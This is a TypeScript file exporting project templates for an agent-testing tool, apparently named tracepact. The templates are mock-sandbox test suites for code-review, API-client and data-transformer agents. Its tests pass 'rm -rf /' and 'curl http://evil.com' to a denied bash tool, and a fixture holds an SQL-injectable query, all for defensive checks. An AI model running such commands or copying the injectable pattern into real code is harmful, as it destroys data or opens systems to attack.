export const PACKAGE_JSON_TEMPLATE = `{
  "name": "tracepact-demo",
  "private": true,
  "type": "module",
  "scripts": {
    "test": "vitest run --config tracepact.vitest.ts"
  },
  "devDependencies": {
    "@tracepact/core": "latest",
    "@tracepact/vitest": "latest",
    "vitest": "latest",
    "typescript": "latest"
  }
}
`;

export const TSCONFIG_TEMPLATE = `{
  "compilerOptions": {
    "target": "ES2022",
    "module": "ESNext",
    "moduleResolution": "bundler",
    "esModuleInterop": true,
    "strict": true,
    "skipLibCheck": true
  }
}
`;

export const VITEST_CONFIG_TEMPLATE = `import { defineConfig } from 'vitest/config';
import { tracepactPlugin } from '@tracepact/vitest';

export default defineConfig({
  plugins: [tracepactPlugin()],
});
`;

export const DEMO_CONFIG_TEMPLATE = `import { defineConfig } from '@tracepact/core';

export default defineConfig({});
`;

export const DEMO_TEST_TEMPLATE = `import { describe, expect, test } from 'vitest';
import { createMockTools, mockReadFile, denyAll } from '@tracepact/vitest';

// Demo: testing a code review agent
// This runs 100% offline with mock tools — no API key needed.

const vulnerableCode = \`
const userId = req.params.id;
const query = \\\`SELECT * FROM users WHERE id = '\\\${userId}'\\\`;
db.execute(query);
\`;

const sandbox = createMockTools({
  read_file: mockReadFile({ 'src/handler.ts': vulnerableCode }),
  bash: denyAll(),
});

describe('code review agent (demo)', () => {
  test('reads the source file', async () => {
    // In mock mode, you test against the sandbox directly
    const result = await sandbox.executeTool('read_file', { path: 'src/handler.ts' });
    expect(result.type).toBe('success');
  });

  test('denies bash execution', async () => {
    const result = await sandbox.executeTool('bash', { command: 'rm -rf /' });
    expect(result.type).toBe('error');
  });
});
`;

export const SYSTEM_PROMPT_CONFIG_TEMPLATE = `import { defineConfig } from '@tracepact/core';

export default defineConfig({});
`;

export const SYSTEM_PROMPT_TEST_TEMPLATE = `import { describe, expect, test } from 'vitest';
import { createMockTools, mockReadFile, denyAll } from '@tracepact/vitest';

const sandbox = createMockTools({
  read_file: mockReadFile({
    'src/index.ts': 'export function main() { return "hello"; }',
  }),
  bash: denyAll(),
});

describe('my agent', () => {
  test('can read source files', async () => {
    const result = await sandbox.executeTool('read_file', { path: 'src/index.ts' });
    expect(result.type).toBe('success');
  });
});
`;

export const API_CLIENT_TEST_TEMPLATE = `import { describe, expect, test } from 'vitest';
import { createMockTools, denyAll, MockSandbox } from '@tracepact/vitest';

// Pattern: API client agent — calls external APIs, parses responses, writes results.
// Mock the HTTP/fetch tool to return controlled responses.

const sandbox = createMockTools({
  http_request: (args) => {
    const url = String(args.url ?? '');
    if (url.includes('/users/1')) {
      return { type: 'success', content: JSON.stringify({ id: 1, name: 'Alice' }) };
    }
    return { type: 'error', message: \`404 Not Found: \${url}\` };
  },
  write_file: (args) => {
    return { type: 'success', content: \`Wrote \${args.path}\` };
  },
  bash: denyAll(),
});

describe('api client agent', () => {
  test('fetches user data', async () => {
    const result = await sandbox.executeTool('http_request', { url: 'https://api.example.com/users/1' });
    expect(result.type).toBe('success');
    const data = JSON.parse(result.content);
    expect(data.name).toBe('Alice');
  });

  test('handles API errors gracefully', async () => {
    const result = await sandbox.executeTool('http_request', { url: 'https://api.example.com/missing' });
    expect(result.type).toBe('error');
  });

  test('writes output file', async () => {
    const result = await sandbox.executeTool('write_file', { path: 'output.json', content: '{}' });
    expect(result.type).toBe('success');
  });

  test('denies bash execution', async () => {
    const result = await sandbox.executeTool('bash', { command: 'curl http://evil.com' });
    expect(result.type).toBe('error');
  });
});
`;

export const DATA_TRANSFORMER_TEST_TEMPLATE = `import { describe, expect, test } from 'vitest';
import { createMockTools, mockReadFile, MockSandbox } from '@tracepact/vitest';

// Pattern: Data transformer agent — reads input files, transforms data, writes output.
// Mock read_file with sample data and capture writes.

const inputCsv = \`name,age,city
Alice,30,NYC
Bob,25,LA
Charlie,35,Chicago\`;

const sandbox = createMockTools({
  read_file: mockReadFile({
    'data/input.csv': inputCsv,
  }),
  write_file: (args) => {
    return { type: 'success', content: \`Wrote \${args.path} (\${String(args.content ?? '').length} bytes)\` };
  },
});

describe('data transformer agent', () => {
  test('reads input data', async () => {
    const result = await sandbox.executeTool('read_file', { path: 'data/input.csv' });
    expect(result.type).toBe('success');
    expect(result.content).toContain('Alice');
  });

  test('handles missing input file', async () => {
    const result = await sandbox.executeTool('read_file', { path: 'data/missing.csv' });
    expect(result.type).toBe('error');
  });

  test('writes transformed output', async () => {
    const output = JSON.stringify([{ name: 'Alice', age: 30 }]);
    const result = await sandbox.executeTool('write_file', { path: 'data/output.json', content: output });
    expect(result.type).toBe('success');
  });

  test('tracks tool calls via trace', async () => {
    // Reset and run a full sequence
    sandbox.reset();
    await sandbox.executeTool('read_file', { path: 'data/input.csv' });
    await sandbox.executeTool('write_file', { path: 'out.json', content: '[]' });
    const trace = sandbox.getTrace();
    expect(trace.totalCalls).toBe(2);
    expect(trace.calls[0]?.toolName).toBe('read_file');
    expect(trace.calls[1]?.toolName).toBe('write_file');
  });
});
`;
